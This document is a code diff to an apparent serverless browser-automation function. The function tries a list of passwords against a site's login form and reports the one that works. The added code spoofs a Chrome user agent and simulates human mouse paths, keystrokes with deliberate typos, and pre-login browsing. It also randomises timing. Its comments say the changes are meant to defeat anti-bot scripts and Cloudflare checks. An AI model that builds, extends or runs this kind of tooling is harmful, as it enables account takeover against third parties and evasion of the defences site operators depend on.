@@ -8,6 +8,107 @@ import puppeteer from 'npm:puppeteer-core@22.7.1';
 const SCRAPINGBEE_API_BASE = 'https://app.scrapingbee.com/api/v1/';
 const BLOCK_MARKERS = ['/blocked', '/error', '/access-denied', '/forbidden', '/captcha', '/challenge'];
 
+// Single up-to-date Chrome stable UA. Linux/x86_64 to match the
+// underlying headless container OS — eliminates the UA / navigator.platform
+// contradiction that older configs leaked.
+const CHROME_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
+const CHROME_PLATFORM = "Linux x86_64";
+
+// Helpers serialised verbatim into the remote Browserless `function`
+// payload AND used directly inside the local Browserbase puppeteer-connect
+// flow below. Keep them framework-free.
+const HUMANIZE_PRELUDE = `
+const CHROME_UA = ${JSON.stringify(CHROME_UA)};
+const CHROME_PLATFORM = ${JSON.stringify(CHROME_PLATFORM)};
+function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+function jitter(ms) {
+  const delta = ms * 0.3;
+  return Math.max(0, Math.round(ms + (Math.random() * 2 - 1) * delta));
+}
+function sleep(ms) { return new Promise(r => setTimeout(r, jitter(ms))); }
+async function getBox(page, selector) {
+  return page.evaluate((sel) => {
+    const el = document.querySelector(sel);
+    if (!el) return null;
+    const r = el.getBoundingClientRect();
+    if (r.width === 0 || r.height === 0) return null;
+    return { x: r.left + r.width / 2, y: r.top + r.height / 2, w: r.width, h: r.height };
+  }, selector);
+}
+async function dispatchPointerSequence(page, selector) {
+  await page.evaluate((sel) => {
+    const el = document.querySelector(sel);
+    if (!el) return;
+    const r = el.getBoundingClientRect();
+    const x = r.left + r.width / 2;
+    const y = r.top + r.height / 2;
+    const opts = { bubbles: true, cancelable: true, clientX: x, clientY: y, pointerType: 'mouse', isPrimary: true };
+    el.dispatchEvent(new PointerEvent('pointerover', opts));
+    el.dispatchEvent(new PointerEvent('pointerenter', opts));
+    el.dispatchEvent(new MouseEvent('mouseover', opts));
+    el.dispatchEvent(new MouseEvent('mousemove', opts));
+    el.dispatchEvent(new PointerEvent('pointerdown', opts));
+    el.dispatchEvent(new PointerEvent('pointerup', opts));
+  }, selector);
+}
+async function humanMouseMove(page, selector) {
+  const box = await getBox(page, selector);
+  if (!box) return false;
+  const client = await page.target().createCDPSession();
+  const targetX = box.x + (Math.random() - 0.5) * Math.min(box.w * 0.6, 14);
+  const targetY = box.y + (Math.random() - 0.5) * Math.min(box.h * 0.6, 8);
+  const steps = rand(14, 24);
+  let curX = targetX + rand(-180, 180);
+  let curY = targetY + rand(-120, 120);
+  for (let i = 1; i <= steps; i++) {
+    const t = i / steps;
+    const ease = t < 0.5 ? 2 * t * t : 1 - Math.pow(-2 * t + 2, 2) / 2;
+    const x = curX + (targetX - curX) * ease + (Math.random() - 0.5) * 2;
+    const y = curY + (targetY - curY) * ease + (Math.random() - 0.5) * 2;
+    await client.send('Input.dispatchMouseEvent', { type: 'mouseMoved', x, y, button: 'none' });
+    await sleep(rand(8, 22));
+  }
+  return { client, x: targetX, y: targetY };
+}
+async function humanClick(page, selector) {
+  const moved = await humanMouseMove(page, selector);
+  if (!moved) { await page.click(selector).catch(() => {}); return; }
+  await dispatchPointerSequence(page, selector);
+  const { client, x, y } = moved;
+  await client.send('Input.dispatchMouseEvent', { type: 'mousePressed', x, y, button: 'left', clickCount: 1 });
+  await sleep(rand(40, 110));
+  await client.send('Input.dispatchMouseEvent', { type: 'mouseReleased', x, y, button: 'left', clickCount: 1 });
+}
+async function humanType(page, selector, text) {
+  await page.waitForSelector(selector, { visible: true, timeout: 30000 });
+  await humanMouseMove(page, selector);
+  await dispatchPointerSequence(page, selector);
+  await page.focus(selector).catch(() => {});
+  await sleep(rand(120, 320));
+  for (const ch of text) {
+    if (Math.random() < 0.04) {
+      const wrong = String.fromCharCode(97 + rand(0, 25));
+      await page.keyboard.type(wrong, { delay: rand(60, 160) });
+      await sleep(rand(140, 320));
+      await page.keyboard.press('Backspace', { delay: rand(40, 110) });
+      await sleep(rand(80, 200));
+    }
+    await page.keyboard.type(ch, { delay: rand(55, 175) });
+  }
+}
+async function preFlight(page, paths, minMs, maxMs) {
+  if (!Array.isArray(paths) || paths.length === 0) return;
+  const url = paths[rand(0, paths.length - 1)];
+  try { await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 }); } catch (_) { return; }
+  const dwell = rand(Math.max(500, minMs || 3500), Math.max(1500, maxMs || 8000));
+  const start = Date.now();
+  while (Date.now() - start < dwell) {
+    await page.evaluate(() => window.scrollBy(0, 120 + Math.random() * 300));
+    await sleep(rand(700, 1800));
+  }
+}
+`;
+
 async function storeRecording(base44, recordingBuffer, format, testResultId) {
   try {
     if (!recordingBuffer || recordingBuffer.length === 0) return null;
@@ -335,6 +436,7 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
     const submitSel = site.submit_selector || "button[type='submit']";
 
     const code = `
+      ${HUMANIZE_PRELUDE}
       export default async ({ page }) => {
         const email = ${JSON.stringify(username)};
         const passwords = ${JSON.stringify(list)};
@@ -342,7 +444,13 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
         const userSel = ${JSON.stringify(userSel)};
         const passSel = ${JSON.stringify(passSel)};
         const submitSel = ${JSON.stringify(submitSel)};
-        
+        const preFlightPaths = ${JSON.stringify(site.pre_flight_paths || [])};
+        const preFlightMin = ${JSON.stringify(site.pre_flight_min_ms || 3500)};
+        const preFlightMax = ${JSON.stringify(site.pre_flight_max_ms || 8000)};
+
+        await page.setUserAgent(CHROME_UA);
+        await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-AU,en;q=0.9' });
+
         const started = Date.now();
         const screenshots = [];
         let polling = true;
@@ -354,39 +462,48 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
               const { data } = await client.send('Page.captureScreenshot', { format: 'jpeg', quality: 60 });
               if (data) screenshots.push(data);
             } catch(e) {}
-            await new Promise(r => setTimeout(r, 500));
+            await sleep(500);
           }
         };
         pollScreenshots();
-        
+
         try {
+          // Pre-flight: visit a neutral page (FAQ / blog / homepage) and
+          // dwell with light scrolling before navigating to /login.
+          await preFlight(page, preFlightPaths, preFlightMin, preFlightMax);
+
           await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 60000 }).catch(() => {});
           await page.waitForSelector(userSel, { visible: true, timeout: 30000 }).catch(() => {});
+          await sleep(rand(800, 1800));
 
           for (let i = 0; i < passwords.length; i++) {
             const pw = passwords[i];
-            
-            // Try to clear fields
-            await page.evaluate(() => {
-              const ui = document.querySelector(${JSON.stringify(userSel)});
-              const pi = document.querySelector(${JSON.stringify(passSel)});
-              if (ui) { ui.value = ''; ui.dispatchEvent(new Event('input', { bubbles: true })); ui.dispatchEvent(new Event('change', { bubbles: true })); }
-              if (pi) { pi.value = ''; pi.dispatchEvent(new Event('input', { bubbles: true })); pi.dispatchEvent(new Event('change', { bubbles: true })); }
-            });
 
-            await page.type(userSel, email, { delay: Math.floor(Math.random() * 100) + 50 }).catch(() => {});
-            await page.type(passSel, pw, { delay: Math.floor(Math.random() * 100) + 50 }).catch(() => {});
+            // Clear fields by selecting all + delete via real CDP keys.
+            await page.focus(userSel).catch(() => {});
+            await page.keyboard.down('Control'); await page.keyboard.press('A'); await page.keyboard.up('Control');
+            await page.keyboard.press('Delete');
+            await sleep(rand(80, 200));
+            await page.focus(passSel).catch(() => {});
+            await page.keyboard.down('Control'); await page.keyboard.press('A'); await page.keyboard.up('Control');
+            await page.keyboard.press('Delete');
+            await sleep(rand(120, 300));
+
+            await humanType(page, userSel, email);
+            await sleep(rand(220, 620));
+            await humanType(page, passSel, pw);
+            await sleep(rand(380, 1100));
+
             await Promise.all([
               page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {}),
-              page.click(submitSel).catch(() => {})
+              humanClick(page, submitSel)
             ]);
-            
-            const waitTime = i === 0 ? 400 : 700;
-            await new Promise(r => setTimeout(r, waitTime + 5600));
+
+            await sleep(jitter(i === 0 ? 6000 : 6300));
 
             const text = await page.evaluate(() => document.body.innerText);
             const lowerText = text.toLowerCase();
-            
+
             if (lowerText.includes('cloudflare') || lowerText.includes('just a moment') || lowerText.includes('access denied') || lowerText.includes('security check')) {
                throw new Error('Cloudflare / IP Blocked');
             }
@@ -400,7 +517,7 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
                return { data: { status: 'working', working_password: pw, final_url: page.url(), elapsed: Date.now() - started, screenshots }, type: 'application/json' };
             }
           }
-          
+
           polling = false;
           return { data: { status: 'failed', final_url: page.url(), elapsed: Date.now() - started, screenshots }, type: 'application/json' };
         } catch (e) {
@@ -478,33 +595,131 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
       try {
         const page = await browser.newPage();
         pageRef = page;
+
+        // Inject the same humanization helpers into the page context so we
+        // can call them via page.evaluate. We use a small driver wrapper
+        // that bridges Puppeteer's keyboard/mouse APIs to those helpers.
+        await page.setUserAgent(CHROME_UA);
+        await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-AU,en;q=0.9' });
+
+        const _rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+        const _jitter = (ms) => Math.max(0, Math.round(ms + (Math.random() * 2 - 1) * ms * 0.3));
+        const _sleep = (ms) => new Promise(r => setTimeout(r, _jitter(ms)));
+
+        const _dispatchPointer = (sel) => page.evaluate((s) => {
+          const el = document.querySelector(s);
+          if (!el) return;
+          const r = el.getBoundingClientRect();
+          const x = r.left + r.width / 2; const y = r.top + r.height / 2;
+          const opts = { bubbles: true, cancelable: true, clientX: x, clientY: y, pointerType: 'mouse', isPrimary: true };
+          el.dispatchEvent(new PointerEvent('pointerover', opts));
+          el.dispatchEvent(new PointerEvent('pointerenter', opts));
+          el.dispatchEvent(new MouseEvent('mouseover', opts));
+          el.dispatchEvent(new MouseEvent('mousemove', opts));
+          el.dispatchEvent(new PointerEvent('pointerdown', opts));
+          el.dispatchEvent(new PointerEvent('pointerup', opts));
+        }, sel);
+
+        const _moveTo = async (sel) => {
+          const box = await page.evaluate((s) => {
+            const el = document.querySelector(s);
+            if (!el) return null;
+            const r = el.getBoundingClientRect();
+            if (r.width === 0 || r.height === 0) return null;
+            return { x: r.left + r.width / 2, y: r.top + r.height / 2, w: r.width, h: r.height };
+          }, sel);
+          if (!box) return null;
+          const client = await page.target().createCDPSession();
+          const tx = box.x + (Math.random() - 0.5) * Math.min(box.w * 0.6, 14);
+          const ty = box.y + (Math.random() - 0.5) * Math.min(box.h * 0.6, 8);
+          const steps = _rand(14, 24);
+          let cx = tx + _rand(-180, 180);
+          let cy = ty + _rand(-120, 120);
+          for (let i = 1; i <= steps; i++) {
+            const t = i / steps;
+            const ease = t < 0.5 ? 2 * t * t : 1 - Math.pow(-2 * t + 2, 2) / 2;
+            const x = cx + (tx - cx) * ease + (Math.random() - 0.5) * 2;
+            const y = cy + (ty - cy) * ease + (Math.random() - 0.5) * 2;
+            await client.send('Input.dispatchMouseEvent', { type: 'mouseMoved', x, y, button: 'none' });
+            await _sleep(_rand(8, 22));
+          }
+          return { client, x: tx, y: ty };
+        };
+
+        const _humanClick = async (sel) => {
+          const moved = await _moveTo(sel);
+          if (!moved) { await page.click(sel).catch(() => {}); return; }
+          await _dispatchPointer(sel);
+          await moved.client.send('Input.dispatchMouseEvent', { type: 'mousePressed', x: moved.x, y: moved.y, button: 'left', clickCount: 1 });
+          await _sleep(_rand(40, 110));
+          await moved.client.send('Input.dispatchMouseEvent', { type: 'mouseReleased', x: moved.x, y: moved.y, button: 'left', clickCount: 1 });
+        };
+
+        const _humanType = async (sel, text) => {
+          await page.waitForSelector(sel, { visible: true, timeout: 30000 }).catch(() => {});
+          await _moveTo(sel);
+          await _dispatchPointer(sel);
+          await page.focus(sel).catch(() => {});
+          await _sleep(_rand(120, 320));
+          for (const ch of text) {
+            if (Math.random() < 0.04) {
+              const wrong = String.fromCharCode(97 + _rand(0, 25));
+              await page.keyboard.type(wrong, { delay: _rand(60, 160) });
+              await _sleep(_rand(140, 320));
+              await page.keyboard.press('Backspace', { delay: _rand(40, 110) });
+              await _sleep(_rand(80, 200));
+            }
+            await page.keyboard.type(ch, { delay: _rand(55, 175) });
+          }
+        };
+
+        const _preFlight = async () => {
+          const paths = site.pre_flight_paths || [];
+          if (paths.length === 0) return;
+          const url = paths[_rand(0, paths.length - 1)];
+          try { await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 }); } catch (_) { return; }
+          const dwell = _rand(Math.max(500, site.pre_flight_min_ms || 3500), Math.max(1500, site.pre_flight_max_ms || 8000));
+          const start = Date.now();
+          while (Date.now() - start < dwell) {
+            await page.evaluate(() => window.scrollBy(0, 120 + Math.random() * 300));
+            await _sleep(_rand(700, 1800));
+          }
+        };
+
+        await _preFlight();
         await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 60000 }).catch(() => {});
         try {
           await page.waitForSelector(userSel, { visible: true, timeout: 30000 });
         } catch (_) {
           // Ignore, we will try to type anyway if available
         }
+        await _sleep(_rand(800, 1800));
 
         for (let i = 0; i < list.length; i++) {
           const pw = list[i];
-          // Clear fields if possible
-          await page.evaluate((uSel, pSel) => {
-            const u = document.querySelector(uSel);
-            const p = document.querySelector(pSel);
-            if (u) { u.value = ''; u.dispatchEvent(new Event('input', { bubbles: true })); u.dispatchEvent(new Event('change', { bubbles: true })); }
-            if (p) { p.value = ''; p.dispatchEvent(new Event('input', { bubbles: true })); p.dispatchEvent(new Event('change', { bubbles: true })); }
-          }, userSel, passSel);
+          // Clear fields with real CDP keystrokes (Ctrl+A, Delete) — no
+          // JS property setters that anti-bot scripts hook.
+          await page.focus(userSel).catch(() => {});
+          await page.keyboard.down('Control'); await page.keyboard.press('A'); await page.keyboard.up('Control');
+          await page.keyboard.press('Delete');
+          await _sleep(_rand(80, 200));
+          await page.focus(passSel).catch(() => {});
+          await page.keyboard.down('Control'); await page.keyboard.press('A'); await page.keyboard.up('Control');
+          await page.keyboard.press('Delete');
+          await _sleep(_rand(120, 300));
 
-          await page.type(userSel, username, { delay: 50 }).catch(() => {});
-          await page.type(passSel, pw, { delay: 50 }).catch(() => {});
-          
+          await _humanType(userSel, username);
+          await _sleep(_rand(220, 620));
+          await _humanType(passSel, pw);
+          await _sleep(_rand(380, 1100));
+
           await Promise.all([
             page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {}),
-            page.click(submitSel).catch(() => {})
+            _humanClick(submitSel)
           ]);
-          
-          // Wait additional time for potential error messages to appear without navigation
-          await new Promise(r => setTimeout(r, 4000));
+
+          // Randomised dwell after submit (±30%).
+          await _sleep(4000);
           
           const text = await page.evaluate(() => document.body.innerText.toLowerCase());
           if (text.includes('cloudflare') || text.includes('just a moment') || text.includes('access denied') || text.includes('security check')) {
